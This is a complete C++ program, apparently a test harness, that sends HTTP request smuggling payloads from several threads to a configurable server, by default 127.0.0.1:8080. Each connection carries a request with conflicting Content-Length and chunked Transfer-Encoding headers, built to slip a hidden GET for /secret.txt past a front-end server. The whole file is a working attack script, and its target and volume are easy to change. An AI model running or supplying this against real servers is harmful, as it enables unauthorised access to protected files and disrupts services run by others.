#include <iostream>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 8080;

void requestSmugglingAttack(int count) {
#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    for (int i = 0; i < count; ++i) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == 0) {
            const char* smuggledRequest =
                "GET /index.html HTTP/1.1\r\n"
                "Host: localhost\r\n"
                "Content-Length: 100\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "GET /secret.txt HTTP/1.1\r\n"
                "Host: localhost\r\n"
                "\r\n";

            send(sock, smuggledRequest, strlen(smuggledRequest), 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            close(sock);
        } else {
            close(sock);
        }
    }

#ifdef _WIN32
    WSACleanup();
#endif
}

int main(int argc, char* argv[]) {
    int numThreads = 5;
    int countPerThread = 20;

    if (argc >= 2) {
        numThreads = std::stoi(argv[1]);
    }
    if (argc >= 3) {
        countPerThread = std::stoi(argv[2]);
    }

    std::cout << "Starting request smuggling attack test..." << std::endl;
    std::cout << "Threads: " << numThreads << std::endl;
    std::cout << "Requests per thread: " << countPerThread << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < numThreads; ++i) {
        threads.emplace_back(requestSmugglingAttack, countPerThread);
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "Test completed!" << std::endl;
    return 0;
}